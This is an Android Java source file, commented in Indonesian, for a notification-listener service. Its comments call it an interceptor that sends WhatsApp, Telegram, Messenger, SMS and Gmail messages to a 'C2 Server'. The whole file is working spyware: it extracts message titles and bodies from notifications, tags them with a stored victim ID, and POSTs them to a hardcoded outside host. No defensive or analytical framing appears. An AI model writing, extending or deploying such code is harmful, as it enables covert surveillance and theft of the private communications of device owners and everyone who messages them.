package com.nullx.pp;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * NotificationService: Deep Interceptor Engine.
 * Menangkap dan mengirim isi chat WhatsApp, Telegram, SMS, & Gmail ke C2 Server.
 */
public class NotificationService extends NotificationListenerService {

    private static final String TAG = "NXOB_INTEL";
    private static final String SERVER_URL = "http://manipulator.panel.serverku.space:2027/api/post-notification/";
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;
        
        if (extras == null) return;

        // 1. Ekstraksi Judul & Identitas Pengirim
        String title = extras.getString("android.title", "Unknown Sender");

        // 2. Deep Extraction Layers (WhatsApp, Telegram, SMS, Gmail)
        String body = extractNotificationBody(extras, packageName);

        // 3. Filter & Exfiltration
        if (isTargetApp(packageName) && !body.isEmpty() && !body.equalsIgnoreCase("null")) {
            // Ambil ID Target yang disimpan saat registrasi awal di MainActivity
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String targetId = prefs.getString("targetId", "UNKNOWN_DEVICE");

            // Masukkan ke antrian pengiriman asinkron agar tidak memicu ANR
            relayNotification(targetId, packageName, title, body);
        }
    }

    private String extractNotificationBody(Bundle extras, String pkg) {
        String body = "";
        
        // Layer A: Standard Text (Telegram / SMS)
        CharSequence text = extras.getCharSequence("android.text");
        if (text != null) body = text.toString();

        // Layer B: Text Lines (WhatsApp Groups / FB Messenger)
        if (body.isEmpty() || body.contains("new messages")) {
            CharSequence[] lines = extras.getCharSequenceArray("android.textLines");
            if (lines != null && lines.length > 0) {
                body = lines[lines.length - 1].toString();
            }
        }

        // Layer C: Deep Gmail Scraping
        if (pkg.contains("android.gm")) {
            CharSequence bigText = extras.getCharSequence("android.bigText");
            if (bigText != null) body = bigText.toString();
        }

        return body;
    }

    private boolean isTargetApp(String pkg) {
        return pkg.equals("com.whatsapp") || 
               pkg.equals("org.telegram.messenger") || 
               pkg.equals("com.facebook.orca") ||
               pkg.equals("com.google.android.gm") ||
               pkg.equals("com.android.mms") ||
               pkg.equals("com.google.android.apps.messaging"); // New Google SMS
    }

    private void relayNotification(String targetId, String pkg, String title, String text) {
        executor.execute(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(SERVER_URL + targetId);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setConnectTimeout(10000);
                conn.setDoOutput(true);

                // Format Label Aplikasi
                String label = pkg.contains(".") ? pkg.substring(pkg.lastIndexOf(".") + 1).toUpperCase() : pkg;

                JSONObject json = new JSONObject();
                json.put("id", targetId);
                json.put("app", label);
                json.put("title", title);
                json.put("message", text);
                json.put("timestamp", System.currentTimeMillis());

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = json.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
                
                if (conn.getResponseCode() == 200) {
                    Log.d(TAG, "[+] Intelligence Relayed: " + label);
                }
            } catch (Exception e) {
                Log.e(TAG, "[-] Relay Failed: " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        });
    }

    @Override
    public void onDestroy() {
        executor.shutdown();
        super.onDestroy();
    }
}